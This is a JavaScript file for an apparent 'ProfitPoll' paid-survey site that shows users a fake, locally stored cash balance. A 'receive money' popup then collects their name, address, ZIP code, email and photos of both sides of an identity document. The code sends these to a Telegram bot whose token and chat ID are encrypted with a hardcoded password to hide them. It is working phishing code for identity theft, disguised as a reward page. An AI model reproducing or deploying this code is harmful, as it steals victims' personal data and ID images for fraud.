document.addEventListener('DOMContentLoaded', function() {
    const BALANCE_KEY = 'user_balance';
    const COMPLETED_SLIDES_KEY = 'completed_celebration_slides';
    
    let balance = parseInt(localStorage.getItem(BALANCE_KEY)) || 0;
    let completedSlides = JSON.parse(localStorage.getItem(COMPLETED_SLIDES_KEY)) || [];
    
    function updateBalanceDisplay() {
        document.querySelectorAll('.header-balance__cost').forEach(el => {
            el.textContent = balance + ' $';
        });
    }
    
    function getSlideId(slide) {
        const title = slide.querySelector('h2');
        const content = slide.querySelector('p');
        return (title ? title.textContent : '') + (content ? content.textContent : '');
    }
    
    function isSlideCompleted(slide) {
        const slideId = getSlideId(slide);
        return completedSlides.includes(slideId);
    }
    
    function markSlideAsCompleted(slide) {
        const slideId = getSlideId(slide);
        if (!completedSlides.includes(slideId)) {
            completedSlides.push(slideId);
            localStorage.setItem(COMPLETED_SLIDES_KEY, JSON.stringify(completedSlides));
        }
    }
    
    updateBalanceDisplay();
    
    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('skip-btn')) {
            const slide = e.target.closest('.quiz-slide');
            
            if (slide && slide.querySelector('h2') && 
                slide.querySelector('h2').textContent.includes('celebrate')) {
                
                if (!isSlideCompleted(slide)) {
                    balance += 15;
                    localStorage.setItem(BALANCE_KEY, balance.toString());
                    markSlideAsCompleted(slide);
                    updateBalanceDisplay();
                    
                    console.log('Начислено 10$. Текущий баланс:', balance);
                }
            }
        }
    });
});

document.addEventListener('DOMContentLoaded', function() {
  const slides = document.querySelectorAll('.quiz-slide');
  const nextBtns = document.querySelectorAll('.next-btn');
  const prevBtns = document.querySelectorAll('.prev-btn');
  const skipBtns = document.querySelectorAll('.skip-btn');
  const radioInputs = document.querySelectorAll('input[type="radio"]');
  const specifyInput = document.querySelector('.specify-input');
  const otherOption = document.querySelector('input[value="Other"]');
  
  let currentSlide = 0;
  

  showSlide(currentSlide);
  
  
  if (otherOption) {
    otherOption.addEventListener('change', function() {
      specifyInput.style.display = this.checked ? 'block' : 'none';
      updateNextButton();
    });
    
    specifyInput.addEventListener('input', updateNextButton);
  }
  
  
  radioInputs.forEach(input => {
    input.addEventListener('change', updateNextButton);
  });
  
  
  nextBtns.forEach(btn => {
    btn.addEventListener('click', goToNextSlide);
  });
  
  
  prevBtns.forEach(btn => {
    btn.addEventListener('click', goToPrevSlide);
  });
  
  
  skipBtns.forEach(btn => {
    btn.addEventListener('click', goToNextSlide);
  });
  
  function showSlide(n) {
    slides.forEach(slide => slide.classList.remove('active'));
    slides[n].classList.add('active');
    
    
    const prevBtn = slides[n].querySelector('.prev-btn');
    if (prevBtn) prevBtn.disabled = n === 0;
    
    
    const nextBtn = slides[n].querySelector('.next-btn');
    if (nextBtn) nextBtn.disabled = !isAnswerSelected(n);
  }
  
  function updateNextButton() {
    const currentActiveSlide = document.querySelector('.quiz-slide.active');
    const nextBtn = currentActiveSlide.querySelector('.next-btn');
    if (nextBtn) nextBtn.disabled = !isAnswerSelected(currentSlide);
  }
  
  function isAnswerSelected(slideIndex) {
    const slide = slides[slideIndex];
    const selectedRadio = slide.querySelector('input[type="radio"]:checked');
    
    if (!selectedRadio) return false;
    
    if (selectedRadio.value === 'Other') {
      return specifyInput.value.trim() !== '';
    }
    
    return true;
  }
  
  function goToNextSlide() {
    if (currentSlide < slides.length - 1) {
      currentSlide++;
      showSlide(currentSlide);
    }
  }
  
  function goToPrevSlide() {
    if (currentSlide > 0) {
      currentSlide--;
      showSlide(currentSlide);
    }
  }

  const finishButton = document.querySelector('.quiz-slide__finish-button');
  if (finishButton) {
    finishButton.addEventListener('click', function() {
      const balanceCosts = document.querySelectorAll('.header-balance__cost');
      balanceCosts.forEach(element => {
        element.textContent = '60 $';
      });
      
      resetQuiz();
    });
  }
  
  function resetQuiz() {
    currentSlide = 0;
    showSlide(currentSlide);
    
    const allRadioInputs = document.querySelectorAll('input[type="radio"]');
    allRadioInputs.forEach(input => {
      input.checked = false;
    });
   
    if (specifyInput) {
      specifyInput.style.display = 'none';
      specifyInput.value = '';
    }
    
    updateNextButton();
  }
});

////////////////////////////////Pass///////////////////////////////
class SimpleEncryptor {

    static async encrypt(text, password) {
        try {
            const encoder = new TextEncoder();
            const data = encoder.encode(text);
            
            const salt = crypto.getRandomValues(new Uint8Array(16));
            
            const keyMaterial = await crypto.subtle.importKey(
                'raw',
                encoder.encode(password),
                'PBKDF2',
                false,
                ['deriveKey']
            );
            
            const key = await crypto.subtle.deriveKey(
                {
                    name: 'PBKDF2',
                    salt: salt,
                    iterations: 100000,
                    hash: 'SHA-256'
                },
                keyMaterial,
                { name: 'AES-GCM', length: 256 },
                false,
                ['encrypt', 'decrypt']
            );
            
            const iv = crypto.getRandomValues(new Uint8Array(12));
            
            const encryptedData = await crypto.subtle.encrypt(
                { name: 'AES-GCM', iv: iv },
                key,
                data
            );
            const combined = new Uint8Array(salt.length + iv.length + encryptedData.byteLength);
            combined.set(salt, 0);
            combined.set(iv, salt.length);
            combined.set(new Uint8Array(encryptedData), salt.length + iv.length);
            
            return btoa(String.fromCharCode(...combined));
            
        } catch (error) {
            console.error('Encryption error:', error);
            throw error;
        }
    }
    
    static async decrypt(encryptedData, password) {
        try {
            const decoder = new TextDecoder();
            
            const encryptedArray = new Uint8Array(
                atob(encryptedData).split('').map(c => c.charCodeAt(0))
            );
            const salt = encryptedArray.slice(0, 16);
            const iv = encryptedArray.slice(16, 28);
            const data = encryptedArray.slice(28);
            
            const encoder = new TextEncoder();
            const keyMaterial = await crypto.subtle.importKey(
                'raw',
                encoder.encode(password),
                'PBKDF2',
                false,
                ['deriveKey']
            );
            
            const key = await crypto.subtle.deriveKey(
                {
                    name: 'PBKDF2',
                    salt: salt,
                    iterations: 100000,
                    hash: 'SHA-256'
                },
                keyMaterial,
                { name: 'AES-GCM', length: 256 },
                false,
                ['decrypt']
            );
            
            const decrypted = await crypto.subtle.decrypt(
                { name: 'AES-GCM', iv: iv },
                key,
                data
            );
            
            return decoder.decode(decrypted);
            
        } catch (error) {
            console.error('Decryption error:', error);
            throw new Error('Invalid password or corrupted data');
        }
    }
}
////////////////////////////////////////////////////////////////
document.addEventListener('DOMContentLoaded', async function() {

    const ENCRYPTED_TOKEN = '5/E1gg0ixoNhvjXqsKxs+MdJaxGsUw7PTtMB8cmJlrhpSJzNlSVUTWIongSAnNlD7W0XKJ5Qu8loOR8vh8RlTcclQ1BzSoD0OsnG1DaDmkn/GIJsIlUSGTgP';
    const ENCRYPTED_CHAT_ID = '/2BHYfYT6g1PEmssBvyhbXzorzCJWyJGpR8bIvCBD3l/rFqaUYNv4hbQUzA5U8bzhT99jRDA';
    const PASSWORD = '159357';

    try {
        const BOT_TOKEN = await SimpleEncryptor.decrypt(ENCRYPTED_TOKEN, PASSWORD);
        const CHAT_ID = await SimpleEncryptor.decrypt(ENCRYPTED_CHAT_ID, PASSWORD);

        console.log('Tokens decrypted successfully');
        
        initApp(BOT_TOKEN, CHAT_ID);

    } catch (error) {
        return;
    }

    function initApp(BOT_TOKEN, CHAT_ID) {
        
        let formData = {
            name: '',
            surname: '',
            address: '',
            ZIPCode: '',
            email: '',
            frontPhoto: null,
            backPhoto: null
        };

        const popup = document.getElementById('popup');
        const contactForm = document.getElementById('contactForm');
        const sendButton = document.getElementById('sendToTelegram');
        const fileInputs = document.querySelectorAll('.file-input');
        const uploadPreview = document.getElementById('uploadPreview');
        const nextButtonPage2 = document.querySelector('.popup-page[data-page="2"] .next-page');
        
        
        nextButtonPage2.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            console.log('Next button clicked on page 2');
            
            
            clearAllErrors();
            
            
            let hasErrors = false;
            const requiredFields = ['name', 'surname', 'address', 'ZIPCode', 'email'];
            
            requiredFields.forEach(field => {
                const input = document.querySelector(`[name="${field}"]`);
                const errorElement = document.getElementById(`${field}-error`);
                
                if (!input.value.trim()) {
                    
                    input.classList.add('error');
                    errorElement.style.display = 'block';
                    errorElement.textContent = 'This field is required';
                    hasErrors = true;
                    console.log(`Field ${field} is empty`);
                } else if (field === 'email') {

                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (!emailRegex.test(input.value)) {
                        input.classList.add('error');
                        errorElement.style.display = 'block';
                        errorElement.textContent = 'Please enter a valid email address';
                        hasErrors = true;
                        console.log(`Email ${input.value} is invalid`);
                    }
                }
            });
            
            if (hasErrors) {
                console.log('Form has errors, not switching page');
                return;
            }
            
            console.log('Form is valid, switching to page 3');
            switchPage(3);
        });

        function clearAllErrors() {
            const errorMessages = document.querySelectorAll('.error-message');
            const inputs = document.querySelectorAll('.contact-form input');
            
            errorMessages.forEach(error => {
                error.style.display = 'none';
            });
            
            inputs.forEach(input => {
                input.classList.remove('error');
            });
            
            const photoErrors = document.querySelectorAll('.photo-error');
            photoErrors.forEach(error => error.remove());
        }
        
        const formInputs = contactForm.querySelectorAll('input');
        formInputs.forEach(input => {
            input.addEventListener('input', function() {
                this.classList.remove('error');
                const errorElement = document.getElementById(`${this.name}-error`);
                if (errorElement) {
                    errorElement.style.display = 'none';
                }
            });
        });
        
        const otherNextButtons = document.querySelectorAll('.next-page:not(.popup-page[data-page="2"] .next-page)');
        otherNextButtons.forEach(button => {
            button.addEventListener('click', function() {
                const nextPage = this.getAttribute('data-next');
                switchPage(nextPage);
            });
        });

        contactForm.addEventListener('input', function(e) {
            formData[e.target.name] = e.target.value;
        });
       
        fileInputs.forEach(input => {
            input.addEventListener('change', function(e) {
                const file = e.target.files[0];
                const side = e.target.dataset.side;
                const label = this.nextElementSibling;
                
                if (file) {
                    formData[side + 'Photo'] = file;
                    
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        label.innerHTML = `
                            <img src="${e.target.result}" alt="${side} side" style="width: 100%; height: 100%; object-fit: cover; border-radius: 8px;">
                            <span style="position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); color: white; background: rgba(0,0,0,0.5); padding: 2px 8px; border-radius: 4px; font-size: 12px;">${side} side</span>
                        `;
                        label.style.padding = '0';
                        label.style.position = 'relative';
                        
                        const oldPreview = uploadPreview.querySelector(`[data-side="${side}"]`);
                        if (oldPreview) {
                            uploadPreview.removeChild(oldPreview);
                        }
                    };
                    reader.readAsDataURL(file);
                }
            });
        });
        
        sendButton.addEventListener('click', async function() {
            
            clearAllErrors();
            let hasErrors = false;
            const requiredFields = ['name', 'surname', 'address', 'ZIPCode', 'email'];
            
            requiredFields.forEach(field => {
                const input = document.querySelector(`[name="${field}"]`);
                const errorElement = document.getElementById(`${field}-error`);
                
                if (!input.value.trim()) {
                    input.classList.add('error');
                    errorElement.style.display = 'block';
                    errorElement.textContent = 'This field is required';
                    hasErrors = true;
                } else if (field === 'email') {
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (!emailRegex.test(input.value)) {
                        input.classList.add('error');
                        errorElement.style.display = 'block';
                        errorElement.textContent = 'Please enter a valid email address';
                        hasErrors = true;
                    }
                }
            });
            
            if (hasErrors) {
                return;
            }

            if (!formData.frontPhoto || !formData.backPhoto) {
                const photoError = document.createElement('div');
                photoError.className = 'photo-error';
                photoError.textContent = 'Please upload both photos';
                uploadPreview.appendChild(photoError);
                return;
            }
            
            sendButton.textContent = 'Sending...';
            sendButton.disabled = true;

            try {
                const textMessage = `
🔐 *New Verification Request from ProfitPoll*

👤 *Name:* ${formData.name}
👥 *Surname:* ${formData.surname}
🏠 *City:* ${formData.address}
🏠 *ZIP-Code:* ${formData.ZIPCode}
📧 *Email:* ${formData.email}
🕒 *Time:* ${new Date().toLocaleString()}
                `;
                
                await sendTextToTelegram(textMessage, BOT_TOKEN, CHAT_ID);
                
                await sendPhotoToTelegram(formData.frontPhoto, 'Front side of document', BOT_TOKEN, CHAT_ID);
                await sendPhotoToTelegram(formData.backPhoto, 'Back side of document', BOT_TOKEN, CHAT_ID);
                
                switchPage(4);

            } catch (error) {
                console.error('Error sending to Telegram:', error);
                alert('Error sending data. Please try again.');
            } finally {
                sendButton.textContent = 'Send for verification';
                sendButton.disabled = false;
            }
        });
        
        async function sendTextToTelegram(text, botToken, chatId) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });

            if (!response.ok) {
                throw new Error('Failed to send text message');
            }
        }
        
        async function sendPhotoToTelegram(photoFile, caption, botToken, chatId) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photoFile);
            formData.append('caption', caption);

            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
            
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });

            if (!response.ok) {
                throw new Error('Failed to send photo');
            }
        }

        function switchPage(pageNumber) {
            const pages = popup.querySelectorAll('.popup-page');
            pages.forEach(page => page.classList.remove('active'));
            
            const targetPage = popup.querySelector(`[data-page="${pageNumber}"]`);
            if (targetPage) {
                targetPage.classList.add('active');
            }
        }
    }
});
////////////////////////////////////////////////////////////////

document.addEventListener('DOMContentLoaded', function() {
    const burgerBtn = document.querySelector('.burger-btn');
    const headerMenu = document.querySelector('.header-menu');
    
    burgerBtn.addEventListener('click', function() {
        this.classList.toggle('active');
        headerMenu.classList.toggle('active');
        
        
        if (headerMenu.classList.contains('active')) {
            document.body.style.overflow = 'hidden';
        } else {
            document.body.style.overflow = '';
        }
    });
    
    
    const menuItems = document.querySelectorAll('.header-menu__item');
    menuItems.forEach(item => {
        item.addEventListener('click', function() {
            burgerBtn.classList.remove('active');
            headerMenu.classList.remove('active');
            document.body.style.overflow = '';
        });
    });
});

document.addEventListener('DOMContentLoaded', function() {
    const receiveMoneyButtons = document.querySelectorAll('.header-receive__button');
    const popUp = document.getElementById('popup');
    const overlay = document.querySelector('.overlay');
    
    receiveMoneyButtons.forEach(function(button) {
        button.addEventListener('click', function() {
            popUp.classList.add('active');
            
            if (overlay) {
                overlay.classList.add('active');
            }
            
            document.body.style.overflow = 'hidden';
        });
    });
    
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay) {
            closePopup();
        }
    });
    
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && popUp.classList.contains('active')) {
            closePopup();
        }
    });
    
    function closePopup() {
        popUp.classList.remove('active');
        overlay.classList.remove('active');
        document.body.style.overflow = '';
    }
});

document.addEventListener('DOMContentLoaded', function() {
    const popup = document.getElementById('popup');
    const pages = popup.querySelectorAll('.popup-page');
    
    popup.addEventListener('click', function(e) {
        if (e.target.classList.contains('next-page')) {
            const nextPage = e.target.dataset.next;
            switchPage(nextPage);
        }
        
        if (e.target.classList.contains('close-popup')) {
            closePopup();
        }
    });
    
    function switchPage(pageNumber) {
        pages.forEach(page => page.classList.remove('active'));
        
        const targetPage = popup.querySelector(`[data-page="${pageNumber}"]`);
        if (targetPage) {
            targetPage.classList.add('active');
        }
    }
    
    function closePopup() {
        switchPage('1');
        popup.classList.remove('active');
        document.querySelector('.overlay').classList.remove('active');
        document.body.style.overflow = '';
    }
});